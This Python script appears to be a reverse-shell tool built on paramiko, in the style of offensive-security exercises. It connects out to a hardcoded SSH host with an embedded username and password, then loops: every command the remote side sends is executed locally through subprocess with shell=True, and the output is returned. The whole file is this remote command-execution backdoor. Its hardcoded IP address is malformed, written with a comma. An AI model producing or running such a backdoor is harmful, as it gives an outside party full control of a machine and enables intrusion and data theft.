# language: Python 3, file: ssh_server.py
# target: Linux, paramiko>=3.0
import paramiko
import threading
import subprocess
import sys


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command.encode())
        print(ssh_session.recv(1024).decode(errors="replace"), end="")
        while True:
            try:
                raw = ssh_session.recv(1024)
            except Exception:
                break
            if not raw:
                break
            cmd = raw.decode(errors="replace").strip()
            if cmd.lower() in ("exit", "quit"):
                ssh_session.send(b"bye\n")
                break
            try:
                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                out = e.output
            except Exception as e:
                out = str(e).encode()
            if len(out) == 0:
                out = b"\n"
            ssh_session.send(out)
    client.close()


if __name__ == "__main__":
    ssh_command("192.168.193,1", 22, "mokht", "hello@44", "ClientConnected")